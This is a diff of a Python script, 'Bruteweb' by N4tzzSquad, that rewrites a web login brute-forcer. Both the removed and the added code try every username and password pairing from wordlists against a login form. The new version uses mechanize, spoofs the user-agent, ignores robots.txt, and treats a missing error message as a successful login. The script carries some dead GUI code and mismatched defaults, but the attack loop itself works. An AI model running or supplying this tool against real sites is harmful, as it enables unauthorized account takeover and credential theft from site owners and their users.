@@ -1,75 +1,120 @@
 #!/usr/bin/env python3
 
-import requests
+import itertools
+import time
+import mechanize
+import argparse
+import threading
+import signal
+import sys
+import os
+import tkinter as tk
+from tkinter import filedialog
+from tkinter import ttk
+import webbrowser
+from urllib.parse import urlparse
+from tkinter import messagebox
 
-# Banner
-def print_banner():
-    banner = """
-    ███╗   ██╗██╗  ██╗████████╗███████╗███████╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗
-    ████╗  ██║██║  ██║╚══██╔══╝╚══███╔╝╚══███╔╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
-    ██╔██╗ ██║███████║   ██║     ███╔╝   ███╔╝     ██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗  ██║   ██║██████╔╝██║     █████╗  
-    ██║╚██╗██║╚════██║   ██║    ███╔╝   ███╔╝      ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
-    ██║ ╚████║     ██║   ██║   ███████╗███████╗    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗
-    ╚═╝  ╚═══╝     ╚═╝   ╚═╝   ╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
-    """
-    print("\033[1;37;41m" + banner + "\033[0m")
+# Bruteweb
+# by N4tzzSquad
+# > https://github.com/N4tzz-Official
+# V2.999
 
-# Function to download file from URL
-def download_file(url):
-    try:
-        response = requests.get(url)
-        response.raise_for_status()
-        return response.text.splitlines()
-    except requests.RequestException as e:
-        print(f"Failed to download file: {e}")
-        return []
+version = "9100"
+window = None
 
-# Brute force attack function
-def brute_force_attack(url, username, password):
-    data = {
-        'username': username,
-        'password': password
-    }
-    try:
-        response = requests.post(url, data=data)
-        if "login failed" not in response.text.lower():
-            return True
-    except requests.RequestException as e:
-        print(f"Request error: {e}")
-    return False
+class TextRedirector:
+    def __init__(self, text_widget, tag="stdout"):
+        self.text_widget = text_widget
+        self.tag = tag
+    def write(self, msg):
+        self.text_widget.config(state=tk.NORMAL)
+        self.text_widget.insert(tk.END, msg, (self.tag,))
+        self.text_widget.see(tk.END)
+        self.text_widget.config(state=tk.DISABLED)
+    def flush(self):
+        pass
 
-def main():
-    print_banner()
+def stop_brute_force():
+    global stop_event
+    stop_event.set()
+    run_button.config(state=tk.NORMAL)
 
-    # Input details from the user
-    url = input("URL (e.g., http://example.com/login): ").strip()
-    if not url.startswith('http'):
-        print("Invalid URL. It should start with 'http://' or 'https://'.")
-        return
+def signal_handler(sig, frame):
+    global stop_event
+    stop_event.set()
+    print("Received Ctrl+C. Stopping...")
 
-    # URL to the raw files on GitHub
-    username_url = input("URL to username list (raw GitHub URL): ").strip()
-    password_url = input("URL to password list (raw GitHub URL): ").strip()
+def validate_non_negative_float(value):
+    f_value = float(value)
+    if f_value < 0:
+        raise argparse.ArgumentTypeError(f"{value} must be a non-negative float.")
+    return f_value
 
-    # Download username and password lists
-    usernames = download_file(username_url)
-    passwords = download_file(password_url)
+def validate_positive_int(value):
+    int_value = int(value)
+    if int_value < 1:
+        raise argparse.ArgumentTypeError(f"{value} must be a positive integer.")
+    return int_value
 
-    if not usernames or not passwords:
-        print("Failed to load username or password lists.")
-        return
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('url', type=str, nargs='?', default='', help="Login URL")
+    parser.add_argument('username', type=str, nargs='?', default='https://github.com/N4tzz-Official/BruteForceWeb/blob/main/username.txt', help="Username URL")
+    parser.add_argument('password', type=str, nargs='?', default='https://github.com/N4tzz-Official/BruteForceWeb/blob/main/password.txt', help="Password URL")
+    parser.add_argument("error", type=str, nargs='?', default='', help="Error message")
+    parser.add_argument("-t", dest='time', action='store', type=validate_non_negative_float, default=0, help="Time sleep m/s")
+    parser.add_argument("-c", dest='header', action='store', type=str, default='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13', help="Custom user-agent")
+    parser.add_argument("-u", dest='usern', action='store', type=str, default='username', help="Form for username, default:username")
+    parser.add_argument("-p", dest='passn', action='store', type=str, default='password', help="Form for password, default:password")
+    parser.add_argument("-v", "--verbose", dest='verb', action='count', default=0, help="Verbosity (between 1-2-3 occurrences with more leading to more verbose logging).")
+    return parser.parse_args()
 
-    # Perform brute force attack
-    for username in usernames:
-        for password in passwords:
-            print("N4tzzSquad Cracking Password!!!")
-            if brute_force_attack(url, username, password):
-                print(f"[*] Success! Username: {username}, Password: {password}")
-                return
-            else:
-                print(f"[-] Incorrect password: {password}")
+# Logo/Banner
+print('''
+    )                      (                                                          (                                               
+ ( /(      )     )         )\ )                    (        (                 )       )\ )                      (  (               )  
+ )\())  ( /(  ( /(        (()/(   (     (      )   )\ )   ( )\  (      (   ( /(   (  (()/(      (           (   )\))(   '   (   ( /(  
+((_)\   )\()) )\())(   (   /(_))( )\   ))\  ( /(  (()/(   )((_) )(    ))\  )\()) ))\  /(_)) (   )(    (    ))\ ((_)()\ )   ))\  )\()) 
+ _((_) ((_)\ (_))/ )\  )\ (_))  )(( ) /((_) )(_))  ((_)) ((_)_ (()\  /((_)(_))/ /((_)(_))_| )\ (()\   )\  /((_)_(())\_)() /((_)((_)\  
+| \| || | (_)| |_ ((_)((_)/ __|((_)_)(_))( ((_)_   _| |   | _ ) ((_)(_))( | |_ (_))  | |_  ((_) ((_) ((_)(_))  \ \((_)/ /(_))  | |(_) 
+| .` ||_  _| |  _||_ /|_ /\__ \/ _` || || |/ _` |/ _` |   | _ \| '_|| || ||  _|/ -_) | __|/ _ \| '_|/ _| / -_)  \ \/\/ / / -_) | '_ \ 
+|_|\_|  |_|   \__|/__|/__||___/\__, | \_,_|\__,_|\__,_|   |___/|_|   \_,_| \__|\___| |_|  \___/|_|  \__| \___|   \_/\_/  \___| |_.__/ 
+                                  |_|                                                                                                       
+''')
 
-    print("[!] No valid password found.")
+def brute_force(url, username_url, password_url, error_message, time_sleep, user_agent, username_field, password_field, verbosity):
+    br = mechanize.Browser()
+    br.set_handle_robots(False)
+    br.addheaders = [('User-agent', user_agent)]
+    
+    with open(username_url) as user_file, open(password_url) as pass_file:
+        usernames = user_file.read().splitlines()
+        passwords = pass_file.read().splitlines()
+    
+    for username, password in itertools.product(usernames, passwords):
+        if stop_event.is_set():
+            break
+        br.open(url)
+        br.select_form(nr=0)
+        br.form[username_field] = username
+        br.form[password_field] = password
+        response = br.submit()
+        content = response.read()
+        
+        if error_message not in content.decode():
+            print(f"Success: Username: {username} Password: {password}")
+            break
+        else:
+            if verbosity > 0:
+                print(f"Failed: Username: {username} Password: {password}")
+        time.sleep(time_sleep)
+
+def start_brute_force():
+    args = parse_args()
+    brute_force(args.url, args.username, args.password, args.error, args.time, args.header, args.usern, args.passn, args.verb)
 
 if __name__ == "__main__":
-    main()
+    signal.signal(signal.SIGINT, signal_handler)
+    stop_event = threading.Event()
+    start_brute_force()
